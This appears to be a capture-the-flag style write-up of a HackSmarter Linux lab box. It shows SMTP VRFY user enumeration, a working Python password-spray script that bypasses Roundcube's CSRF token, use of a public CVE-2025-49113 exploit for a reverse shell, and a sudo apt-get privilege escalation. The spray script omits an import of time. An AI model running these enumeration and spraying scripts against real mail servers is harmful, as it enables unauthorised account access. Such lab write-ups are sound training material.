---
title: HackSmarter - Aftermath
date: 2026-09-10
excerpt: You have been assigned a penetration test against a Linux server in the client's network. Your objective is to gain root access. The client has planted three flags on the system, retrieving each of these flags demonstrates impact.
readingTime: 5
tags:
  - Writeup
  - hacksmarter
  - Linux
  - Easy
  - mail
author: pir4cy
coverImage: /images/writeups/covers/hacksmarter/hacksmarter-aftermath-cover.png
draft: false
---
## Objective

You have been assigned a penetration test against a Linux server in the client's network. Your objective is to gain root access. The client has planted three flags on the system, retrieving each of these flags demonstrates impact.

### Initial Access

Another team member pulled down a list of names and passwords from DeHashed... but are unsure if any of them are valid.

we got names.txt and passwords.txt

## Recon

As always, starting with nmap

![nmap.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/nmap.png "Nmap")

I added the following to my hosts file for ease:

```bash
10.0.29.56        aftermath.local
```

## Enumeration

Let's take a look at what's hosted on port 80.

![main-website.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/main-website.png)

We just have a video running on port 80 - `22.mp4`. I reviewed the source code as well but nothing of interest was found.

With that I moved on to performing a directory fuzz to see if we can find other potential directories.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://aftermath.local/FUZZ
```

![ffuf-directory-found.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/ffuf-directory-found.png)

### Roundcube

Initially, we had a list of usernames and passwords, which were not validated. Let's see if we can validate the credentials via Roundcube.  

![roundcube login](/images/writeups/machines/hacksmarter/HSM_Aftermath/roundcube-login-1.png)

Let's capture this request using Caido and see if we can brute force this login.  

![csrf-protection-roundcube.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/csrf-protection-roundcube.png)  

With the CSRF token in place, automated brute force will be hard to perform. Since we have to validate username AND password this becomes a tougher route.

### SMTP

Instead of the brute force, we can enumerate valid usernames from SMTP.  
From our nmap output, we can see the `VRFY` command is accepted.

1.  Connect to the SMTP service using `nc -v aftermath.local 25`
2.  Use `vrfy <username>` and verify users from the `names.txt` file provided initially.  

    ![smtp-enum-manual.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/smtp-enum-manual.png)

Since the file is huge, I wouldn't want to go through the username list manually. It's better to automate this.

#### Option 1: Bash script

I ended up using a quick while loop to connect to the SMTP service, `VRFY` the username and then `QUIT`.

> At first I figured it would be quite simple to spray all the usernames with `vrfy` at the beginning but the server kept rate-limiting me.

```bash
while read user; do
    printf "VRFY %s\r\nQUIT" "$user" | nc -w 2 aftermath.local 25 | grep -vE '^(550|220)'
done < names.txt
```

With this, we are suppressing the reject code and the banner code. So hopefully, we will only see the valid user response.  

![smtp-enum-1.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/smtp-enum-1.png)

Valid user found: `maria`

#### Option 2: smpt-user-enum

There's also a tool called `smtp-user-enum` in kali linux. Follows a simple syntax:

```bash
smtp-user-enum -M VRFY -U names.txt -t aftermath.local
```

![smtp-enum-2.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/smtp-enum-2.png)  

This method is much faster! Definitely a good tool to have in your toolkit.

## Foothold

With our valid usernames in hand, we can now login to RoundCube.  
As discussed earlier, Roundcube does have CSRF protection, which will prevent us from doing a password spray on the host.

We can do a password spray by requesting a new token before each POST request and then passing that token in our request.

This task is best suited for Python. Wrote a quick script based on our POST request.

```python
import requests
from bs4 import BeautifulSoup

URL = "http://mail.aftermath.local/roundcube/"
USER = "maria"

with open("passwords.txt", "r", errors="ignore") as f:
    passwords = [x.strip() for x in f if x.strip()]

s = requests.Session()

for password in passwords:
    # If you face rate limits, increase the timeout. 
    time.sleep(10)
    # Get fresh session + CSRF token
    r = s.get(URL)

    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "_token"})["value"]

    data = {
        "_token": token,
        "_task": "login",
        "_action": "login",
        "_timezone": "Asia/Kolkata",
        "_url": "_task=login",
        "_user": USER,
        "_pass": password,
    }

    r = s.post(URL + "?_task=login", data=data, allow_redirects=False)

    print(password, r.status_code, len(r.content), r.headers.get("Location"))

    if r.status_code in (301, 302) and "_task=mail" in r.headers.get("Location", ""):
        print(f"[+] POSSIBLE PASSWORD: {password}")
        break
```

and boom! we got our password:  

![password-found.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/password-found.png)

## Flag #1

Let's login and see what we can find from this maria user.  

![flag-1.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/flag-1.png)

There's flag #1.

Let's enumerate further and find out as much as we can.

![roundcube-version.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/roundcube-version.png)

For this version, we were able to quickly find a known vulnerability (CVE-2025-49113) and lucky for us, there's a PoC available on Github:

- [Github PoC CVE-2025-49113](https://github.com/hakaioffsec/CVE-2025-49113-exploit)
- For a deeper dive into the vulnerability, I recommend reading through [Behind the Bug: Logic Error in Roundcube Session Parser \[CVE-2025-49113\]](https://hakaisecurity.io/behind-the-bug-logic-error-in-roundcube-session-parser-cve-2025-49113/research-blog/)

### Exploitation

The PoC makes this very simple, we can simply run the php script and execute our commands on the target. I used penelope for my listener and ran a simple bash reverse shell.  

![rce-shell.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/rce-shell.png)

## Privilege Escalation - from www-data to root

With this shell, I was still unable to review files for any users, so I started testing for any potential ways to perform privesc.  
I ran `linenum.sh` on the host to flag for potential privesc routes to take:  

![privesc-found.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/privesc-found.png)

Turns out `sudo -l` was all we needed!

When it comes to Unix executables that can be used for privesc, it's always a good idea to check our trusty https://gtfobins.org/.  

![apt-get-sudo.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/apt-get-sudo.png)

With that, we can now privesc to root!  

![root.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/root.png)

Now that we have complete control of the box, let's look for the flags.  

![root-flags.png](/images/writeups/machines/hacksmarter/HSM_Aftermath/root-flags.png)

## Conclusion

Another fun box from HackSmarter, great for bolstering my methodology and becoming faster over time.

Great attack chain for this one.  
SMTP Enum -> RoundCube Password Spray -> Post-Authenticated vulnerability in RoundCube v 1.5.9 -> Overly permissive sudoers file.

Roundcube is an old friend that keeps showing up in boxes and that vulnerability itself existed in Roundcube for 10 years before it was caught by researchers.
